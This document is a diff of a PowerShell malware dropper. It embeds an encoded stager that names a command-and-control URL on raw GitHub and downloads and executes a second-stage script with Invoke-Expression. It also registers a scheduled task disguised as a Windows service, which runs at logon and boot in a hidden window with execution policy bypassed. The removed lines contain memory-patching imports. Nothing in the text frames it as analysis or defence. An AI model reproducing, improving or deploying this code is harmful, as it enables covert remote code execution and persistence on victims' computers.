@@ -1,66 +1,45 @@
-$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
 
-# =============================
-# PASTE YOUR BASE64 HERE
-# (Base64 of 3.ps1 EncodedBody)
-# =============================
-$EMBEDDED_BASE64 = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgANAAoAJABDADIAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHcAbwBsAGYAZwBhAG4AZwBwAGgAZQBsAGEAbgA5ADkANAA5ADIANAAvAHcAaQBuAGQAbwB3ADEAMQAvAG0AYQBpAG4AIgANAAoAJABTAHQAYQBnAGUAMQBVAHIAbAAgAD0AIAAiACQAQwAyAC8AMQAuAHAAcwAxACIADQAKACQARQBuAGMAbwBkAGUAZABCAG8AZAB5ACAAPQAgACIAZABBAEIAeQBBAEgAawBBAEkAQQBCADcAQQBBAG8AQQBJAEEAQQBnAEEAQwBBAEEASQBBAEEAawBBAEgAYwBBAFoAUQBCAGkAQQBFAE0AQQBiAEEAQgBwAEEARwBVAEEAYgBnAEIAMABBAEMAQQBBAFAAUQBBAGcAQQBFADQAQQBaAFEAQgAzAEEAQwAwAEEAVAB3AEIAaQBBAEcAbwBBAFoAUQBCAGoAQQBIAFEAQQBJAEEAQgBPAEEARwBVAEEAZABBAEEAdQBBAEYAYwBBAFoAUQBCAGkAQQBFAE0AQQBiAEEAQgBwAEEARwBVAEEAYgBnAEIAMABBAEEAbwBBAEkAQQBBAGcAQQBDAEEAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAaABBAEcAYwBBAFoAUQBBAHgAQQBFAE0AQQBiAHcAQgB1AEEASABRAEEAWgBRAEIAdQBBAEgAUQBBAEkAQQBBADkAQQBDAEEAQQBKAEEAQgAzAEEARwBVAEEAWQBnAEIARABBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQB1AEEARQBRAEEAYgB3AEIAMwBBAEcANABBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBVAHcAQgAwAEEARwBFAEEAWgB3AEIAbABBAEQARQBBAFYAUQBCAHkAQQBHAHcAQQBLAFEAQQBLAEEAQwBBAEEASQBBAEEAZwBBAEMAQQBBAFMAUQBCAHUAQQBIAFkAQQBiAHcAQgByAEEARwBVAEEATABRAEIARgBBAEgAZwBBAGMAQQBCAHkAQQBHAFUAQQBjAHcAQgB6AEEARwBrAEEAYgB3AEIAdQBBAEMAQQBBAEoAQQBCAHoAQQBIAFEAQQBZAFEAQgBuAEEARwBVAEEATQBRAEIARABBAEcAOABBAGIAZwBCADAAQQBHAFUAQQBiAGcAQgAwAEEAQQBvAEEAZgBRAEEAZwBBAEcATQBBAFkAUQBCADAAQQBHAE0AQQBhAEEAQQBnAEEASABzAEEAQwBnAEEAZwBBAEMAQQBBAEkAQQBBAGcAQQBGAGMAQQBjAGcAQgBwAEEASABRAEEAWgBRAEEAdABBAEYAWQBBAFoAUQBCAHkAQQBHAEkAQQBiAHcAQgB6AEEARwBVAEEASQBBAEEAaQBBAEUAWQBBAFkAUQBCAHAAQQBHAHcAQQBaAFEAQgBrAEEARABvAEEASQBBAEEAawBBAEYAOABBAEkAZwBBAEsAQQBIADAAQQAiAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAaQBmACAAKAAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQARABlAGMAbwBkAGUAZABCAG8AZAB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABFAG4AYwBvAGQAZQBkAEIAbwBkAHkAKQApAA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABEAGUAYwBvAGQAZQBkAEIAbwBkAHkADQAKACAAIAAgACAAfQANAAoAfQAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0AVgBlAHIAYgBvAHMAZQAgACIARAByAG8AcABwAGUAcgAgAGYAYQBpAGwAZQBkADoAIAAkAF8AIgANAAoAfQA="
-# =============================
-# CONFIG
-# =============================
+$EMBEDDED_BASE64 = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACQAUAByAG8AZwByAGUAcwBzAFAAcgBlAGYAZQByAGUAbgBjAGUAIAA9ACAAIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIACgAkAEMAMgAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AdwBvAGwAZgBnAGEAbgBnAHAAaABlAGwAYQBuADkAOQA0ADkAMgA0AC8AdwBpAG4AZABvAHcAMQAxAC8AbQBhAGkAbgAiAAoAJABTAHQAYQBnAGUAMQBVAHIAbAAgAD0AIAAiACQAQwAyAC8AMQAuAHAAcwAxACIACgAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQAgAD0AIAAiAGQAQQBCAHkAQQBIAGsAQQBJAEEAQgA3AEEAQQBvAEEASQBBAEEAZwBBAEMAQQBBAEkAQQBBAGsAQQBIAGMAQQBaAFEAQgBpAEEARQBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDAEEAQQBQAFEAQQBnAEEARQA0AEEAWgBRAEIAMwBBAEMAMABBAFQAdwBCAGkAQQBHAG8AQQBaAFEAQgBqAEEASABRAEEASQBBAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAGMAQQBaAFEAQgBpAEEARQBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBBAG8AQQBJAEEAQQBnAEEAQwBBAEEASQBBAEEAawBBAEgATQBBAGQAQQBCAGgAQQBHAGMAQQBaAFEAQQB4AEEARQBNAEEAYgB3AEIAdQBBAEgAUQBBAFoAUQBCAHUAQQBIAFEAQQBJAEEAQQA5AEEAQwBBAEEASgBBAEIAMwBBAEcAVQBBAFkAZwBCAEQAQQBHAHcAQQBhAFEAQgBsAEEARwA0AEEAZABBAEEAdQBBAEUAUQBBAGIAdwBCADMAQQBHADQAQQBiAEEAQgB2AEEARwBFAEEAWgBBAEIAVABBAEgAUQBBAGMAZwBCAHAAQQBHADQAQQBaAHcAQQBvAEEAQwBRAEEAVQB3AEIAMABBAEcARQBBAFoAdwBCAGwAQQBEAEUAQQBWAFEAQgB5AEEARwB3AEEASwBRAEEASwBBAEMAQQBBAEkAQQBBAGcAQQBDAEEAQQBTAFEAQgB1AEEASABZAEEAYgB3AEIAcgBBAEcAVQBBAEwAUQBCAEYAQQBIAGcAQQBjAEEAQgB5AEEARwBVAEEAYwB3AEIAegBBAEcAawBBAGIAdwBCAHUAQQBDAEEAQQBKAEEAQgB6AEEASABRAEEAWQBRAEIAbgBBAEcAVQBBAE0AUQBCAEQAQQBHADgAQQBiAGcAQgAwAEEARwBVAEEAYgBnAEIAMABBAEEAbwBBAGYAUQBBAGcAQQBHAE0AQQBZAFEAQgAwAEEARwBNAEEAYQBBAEEAZwBBAEgAcwBBAEMAZwBBAGcAQQBDAEEAQQBJAEEAQQBnAEEARgBjAEEAYwBnAEIAcABBAEgAUQBBAFoAUQBBAHQAQQBGAFkAQQBaAFEAQgB5AEEARwBJAEEAYgB3AEIAegBBAEcAVQBBAEkAQQBBAGkAQQBFAFkAQQBZAFEAQgBwAEEARwB3AEEAWgBRAEIAawBBAEQAbwBBAEkAQQBBAGsAQQBGADgAQQBJAGcAQQBLAEEASAAwAEEAIgAKAHQAcgB5ACAAewAKACAAIAAgACAAaQBmACAAKAAkAEUAbgBjAG8AZABlAGQAQgBvAGQAeQApACAAewAKACAAIAAgACAAIAAgACAAIAAkAEQAZQBjAG8AZABlAGQAQgBvAGQAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQARQBuAGMAbwBkAGUAZABCAG8AZAB5ACkAKQAKACAAIAAgACAAIAAgACAAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAEQAZQBjAG8AZABlAGQAQgBvAGQAeQAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBWAGUAcgBiAG8AcwBlACAAIgBEAHIAbwBwAHAAZQByACAAZgBhAGkAbABlAGQAOgAgACQAXwAiAAoAfQA="
+
 $TempDir = $env:TEMP
 $TaskName = "TaskSchedulerService"
-
-# =============================
-# WIN32 P/INVOKE
-# =============================
-Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @"
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")]
-    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-"@
-
-$PAGE_EXECUTE_READWRITE = 0x40
-$MEM_COMMIT = 0x1000
-$MEM_RESERVE = 0x2000
-$PATCH_SIZE = 12
-
-# =============================
-# BUILD TASK XML
-# =============================
+$TaskPath = "\$TaskName"
 function Build-TaskXml {
     param(
         [string]$Base64Cmd,
         [string]$OutputXmlPath
     )
 
+    $currentUserName = [System.Environment]::UserName
+    $currentDomain = [System.Environment]::UserDomainName
+    $userId = if ($currentDomain -eq "." -or $currentDomain -eq $env:COMPUTERNAME) { 
+        "$env:COMPUTERNAME\$currentUserName" 
+    } else { 
+        "$currentDomain\$currentUserName" 
+    }
+
     $xmlTemplate = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-10-27T12:00:00</Date>
-    <Author>SYSTEM</Author>
+    <Author>$currentUserName</Author>
     <Description>Windows Task Scheduler Service</Description>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
     </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+    </BootTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <LogonType>Batch</LogonType>
-      <UserId>SYSTEM</UserId>
+      <UserId>$userId</UserId>
+      <LogonType>InteractiveToken</LogonType>
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
@@ -76,10 +55,8 @@ function Build-TaskXml {
       <RestartOnIdle>false</RestartOnIdle>
     </IdleSettings>
     <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enable>true</Enable>
+    <Enabled>true</Enabled>
     <Hidden>false</Hidden>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
   </Settings>
   <Actions Context="Author">
     <Exec>
@@ -92,29 +69,30 @@ function Build-TaskXml {
 
     [System.IO.File]::WriteAllText($OutputXmlPath, $xmlTemplate, [System.Text.Encoding]::Unicode)
 }
-
-# =============================
-# PERSISTENCE
-# =============================
 function Invoke-Persistence {
     try {
-        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-        if ($existingTask) { return }
-
-        # Build XML with embedded Base64
+        # Write dropper to temp file
         $xmlPath = Join-Path $TempDir "task.xml"
+        
+        # Build XML
         Build-TaskXml -Base64Cmd $EMBEDDED_BASE64 -OutputXmlPath $xmlPath
-
-        # Register task
-        schtasks /Create /TN "\$TaskName" /XML $xmlPath /F | Out-Null
+        
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$xmlPath`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"
+        
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Force
+        Start-ScheduledTask -TaskName $TaskName
+         if ($LASTEXITCODE -ne 0) {
+            throw "schtasks failed: $($result -join ' ')"
+        }
 
         # Cleanup
         Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
-    } catch {}
+        Write-Verbose "Task '$TaskName' registered successfully."
+    } catch {
+        Write-Error "Persistence failed: $_"
+    }
 }
 
-# =============================
-# MAIN
-# =============================
 Start-Sleep -Seconds 2
 Invoke-Persistence
